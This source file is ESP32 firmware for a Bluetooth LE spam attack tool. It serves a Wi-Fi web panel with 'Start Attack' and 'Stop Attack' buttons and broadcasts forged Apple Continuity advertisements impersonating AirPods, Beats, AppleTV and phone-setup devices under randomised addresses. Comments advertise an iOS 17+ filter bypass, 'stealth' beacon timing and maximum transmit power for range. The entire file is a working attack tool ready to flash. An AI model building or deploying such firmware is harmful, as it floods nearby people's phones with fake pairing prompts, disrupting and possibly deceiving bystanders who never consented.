#include <WiFi.h>
#include <WebServer.h>
#include <NimBLEDevice.h>
#include "host/ble_hs.h"
#include <Adafruit_NeoPixel.h> 

const int BUTTON_PIN = 0; 
const int RGB_LED_PIN = 48; 

Adafruit_NeoPixel strip(1, RGB_LED_PIN, NEO_GRB + NEO_KHZ800);

const char* ssid = "BLE_Spam_AP";
const char* password = "password123"; 

WebServer server(80);
NimBLEAdvertising *pAdvertising;

int attack_state = 0; 
int device_choice = 0;
int device_index = 0;
int selectedPacket = 30; // Default: Random Attack

// iOS 17+ / Android Filter Bypass: 4-second persistence delay
uint32_t delayMilliseconds = 4000;

// Device Payloads
const uint8_t DEVICES[][31] = {
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
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  {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x16, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
};

const uint8_t SHORT_DEVICES[][23] = {
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x20, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00},
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  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}
};

void handleRoot() {
  String html = "<!DOCTYPE html><html><head><meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<style>body{font-family:Arial,sans-serif; text-align:center; background-color:#121212; color:#ffffff; padding-top:50px;}";
  html += ".btn{padding:20px 40px; font-size:24px; font-weight:bold; color:white; border:none; border-radius:10px; cursor:pointer; width:80%; max-width:300px;}";
  html += ".start{background-color:#28a745; box-shadow: 0 4px 15px rgba(40,167,69,0.5);}";
  html += ".start:hover{background-color:#218838;}";
  html += ".stop{background-color:#dc3545; box-shadow: 0 4px 15px rgba(220,53,69,0.5);}";
  html += ".stop:hover{background-color:#c82333;}</style></head><body>";
  
  html += "<h2>BLE Control Panel</h2>";
  
  if (attack_state == 1) {
    html += "<p style='font-size:20px;'>Status: <b style='color:#28a745;'>ACTIVE (Broadcasting)</b></p><br>";
    html += "<a href='/stop'><button class='btn stop'>Stop Attack</button></a>";
  } else {
    html += "<p style='font-size:20px;'>Status: <b style='color:#dc3545;'>STANDBY</b></p><br>";
    html += "<a href='/start'><button class='btn start'>Start Attack</button></a>";
  }
  
  html += "</body></html>";
  server.send(200, "text/html", html);
}

void handleStart() {
  attack_state = 1;
  server.sendHeader("Location", "/");
  server.send(303);
}

void handleStop() {
  attack_state = 0;
  if (pAdvertising) {
    pAdvertising->stop();
  }
  server.sendHeader("Location", "/");
  server.send(303);
}

void setup() {
  Serial.begin(115200);

  randomSeed(esp_random());

  Serial.println("\nStarting AP...");
  WiFi.softAP(ssid, password);
  
  Serial.println("AP Started!");
  Serial.print("Control Panel IP: ");
  Serial.println(WiFi.softAPIP()); 

  server.on("/", handleRoot);
  server.on("/start", handleStart);
  server.on("/stop", handleStop);
  server.begin();
  Serial.println("Web Server Started.");

  strip.begin();
  strip.setBrightness(1); 
  strip.clear();
  strip.show(); 

  NimBLEDevice::init("AirPods");
  
  // Maximize TX Power (+9 dBm) for extended operational range
  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
  
  NimBLEServer *pServer = NimBLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  uint8_t null_addr[6] = {0x69, 0xEE, 0xFF, 0xC0, 0xED, 0xFE};
  null_addr[5] |= 0xC0; 
  ble_hs_id_set_rnd(null_addr);
}

NimBLEAdvertisementData getAdvertismentData() {
  NimBLEAdvertisementData oAdvertisementData = NimBLEAdvertisementData();

  if (device_choice == 0) {
    oAdvertisementData.addData(DEVICES[device_index], 31);
  }
  else if (device_choice == 1) {
    oAdvertisementData.addData(SHORT_DEVICES[device_index], 23);
  }
  else if (device_choice == 2) {
    int payload_choice = random(2);
    if (payload_choice == 0) {
      oAdvertisementData.addData(DEVICES[random(17)], 31);
    }
    else {
      oAdvertisementData.addData(SHORT_DEVICES[random(13)], 23);
    }
  }
  else if (device_choice == 3) {
    int payload_choice = random(2);
    if (payload_choice == 0) {
      oAdvertisementData.addData(SHORT_DEVICES[2], 23);
    }
    else {
      oAdvertisementData.addData(SHORT_DEVICES[8], 23);
    }
  }

  return oAdvertisementData;
}

void selectDevice(int selectedPacket);
void Airpods(); void Airpods_pro(); void Airpods_Max(); void Airpods_Gen_2();
void Airpods_Gen_3(); void Airpods_Pro_Gen_2(); void Power_Beats(); void Power_Beats_Pro();
void Beats_Solo_Pro(); void Beats_Studio_Buds(); void Beats_Flex(); void Beats_X();
void Beats_Solo_3(); void Beats_Studio_3(); void Beats_Studio_Pro(); void Betas_Fit_Pro();
void Beats_Studio_Buds_Plus(); void AppleTV_Setup(); void AppleTV_Pair(); void AppleTV_New_User();
void AppleTV_AppleID_Setup(); void AppleTV_Wireless_Audio_Sync(); void AppleTV_Homekit_Setup();
void AppleTV_Keyboard_Setup(); void AppleTV_Connecting_to_Network(); void Homepod_Setup();
void Setup_New_Phone(); void Transfer_Number(); void TV_Color_Balance(); void Apple_Vision_Pro();
void Random_Attack(); void Extended_Attack(); void Flipper_Zero();

void loop() {
  
  server.handleClient();

  if (attack_state == 1) {
    strip.setPixelColor(0, strip.Color(0, 255, 0));
    strip.show();

    uint8_t dummy_addr[6] = {0};
    for (int i = 0; i < 6; i++) {
      dummy_addr[i] = random(256);
    }
    dummy_addr[5] |= 0xC0; 
    
    selectDevice(selectedPacket);
    
    pAdvertising->stop();
    ble_hs_id_set_rnd(dummy_addr);
    
    NimBLEAdvertisementData oAdvertisementData = getAdvertismentData();
    pAdvertising->setAdvertisementData(oAdvertisementData);

    // Stealth Mode Configuration: 0x140 mimics real device beacon timing
    pAdvertising->setMinInterval(0x140);
    pAdvertising->setMaxInterval(0x140);
    
    pAdvertising->start();
    
    unsigned long start_time = millis();
    while (millis() - start_time < delayMilliseconds) {
      server.handleClient(); 
      if (attack_state == 0) {
        strip.clear();
        strip.show();
        break;
      }
      delay(10);
    }
  } else {
    strip.clear();
    strip.show();
  }
}

void selectDevice(int selectedPacket) {
  switch (selectedPacket) {
    case 0: Airpods(); break; case 1: Airpods_pro(); break; case 2: Airpods_Max(); break;
    case 3: Airpods_Gen_2(); break; case 4: Airpods_Gen_3(); break; case 5: Airpods_Pro_Gen_2(); break;
    case 6: Power_Beats(); break; case 7: Power_Beats_Pro(); break; case 8: Beats_Solo_Pro(); break;
    case 9: Beats_Studio_Buds(); break; case 10: Beats_Flex(); break; case 11: Beats_X(); break;
    case 12: Beats_Solo_3(); break; case 13: Beats_Studio_3(); break; case 14: Beats_Studio_Pro(); break;
    case 15: Betas_Fit_Pro(); break; case 16: Beats_Studio_Buds_Plus(); break; case 17: AppleTV_Setup(); break;
    case 18: AppleTV_Pair(); break; case 19: AppleTV_New_User(); break; case 20: AppleTV_AppleID_Setup(); break;
    case 21: AppleTV_Wireless_Audio_Sync(); break; case 22: AppleTV_Homekit_Setup(); break;
    case 23: AppleTV_Keyboard_Setup(); break; case 24: AppleTV_Connecting_to_Network(); break;
    case 25: Homepod_Setup(); break; case 26: Setup_New_Phone(); break; case 27: Transfer_Number(); break;
    case 28: TV_Color_Balance(); break; case 29: Apple_Vision_Pro(); break; case 30: Random_Attack(); break;
    case 31: Extended_Attack(); break; case 32: Flipper_Zero(); break; default: Random_Attack(); break;
  }
}

void Airpods() { device_choice = 0; device_index = 0; attack_state = 1; }
void Airpods_pro() { device_choice = 0; device_index = 1; attack_state = 1; }
void Airpods_Max() { device_choice = 0; device_index = 2; attack_state = 1; }
void Airpods_Gen_2() { device_choice = 0; device_index = 3; attack_state = 1; }
void Airpods_Gen_3() { device_choice = 0; device_index = 4; attack_state = 1; }
void Airpods_Pro_Gen_2() { device_choice = 0; device_index = 5; attack_state = 1; }
void Power_Beats() { device_choice = 0; device_index = 6; attack_state = 1; }
void Power_Beats_Pro() { device_choice = 0; device_index = 7; attack_state = 1; }
void Beats_Solo_Pro() { device_choice = 0; device_index = 8; attack_state = 1; }
void Beats_Studio_Buds() { device_choice = 0; device_index = 9; attack_state = 1; }
void Beats_Flex() { device_choice = 0; device_index = 10; attack_state = 1; }
void Beats_X() { device_choice = 0; device_index = 11; attack_state = 1; }
void Beats_Solo_3() { device_choice = 0; device_index = 12; attack_state = 1; }
void Beats_Studio_3() { device_choice = 0; device_index = 13; attack_state = 1; }
void Beats_Studio_Pro() { device_choice = 0; device_index = 14; attack_state = 1; }
void Betas_Fit_Pro() { device_choice = 0; device_index = 15; attack_state = 1; }
void Beats_Studio_Buds_Plus() { device_choice = 0; device_index = 16; attack_state = 1; }
void AppleTV_Setup() { device_choice = 1; device_index = 0; attack_state = 1; }
void AppleTV_Pair() { device_choice = 1; device_index = 1; attack_state = 1; }
void AppleTV_New_User() { device_choice = 1; device_index = 2; attack_state = 1; }
void AppleTV_AppleID_Setup() { device_choice = 1; device_index = 3; attack_state = 1; }
void AppleTV_Wireless_Audio_Sync() { device_choice = 1; device_index = 4; attack_state = 1; }
void AppleTV_Homekit_Setup() { device_choice = 1; device_index = 5; attack_state = 1; }
void AppleTV_Keyboard_Setup() { device_choice = 1; device_index = 6; attack_state = 1; }
void AppleTV_Connecting_to_Network() { device_choice = 1; device_index = 7; attack_state = 1; }
void Homepod_Setup() { device_choice = 1; device_index = 8; attack_state = 1; }
void Setup_New_Phone() { device_choice = 1; device_index = 9; attack_state = 1; }
void Transfer_Number() { device_choice = 1; device_index = 10; attack_state = 1; }
void TV_Color_Balance() { device_choice = 1; device_index = 11; attack_state = 1; }
void Apple_Vision_Pro() { device_choice = 1; device_index = 12; attack_state = 1; }
void Random_Attack(){ device_choice = 2; attack_state = 1; }
void Extended_Attack(){ device_choice = 3; attack_state = 1; }
void Flipper_Zero() { device_choice = 3; attack_state = 1; }
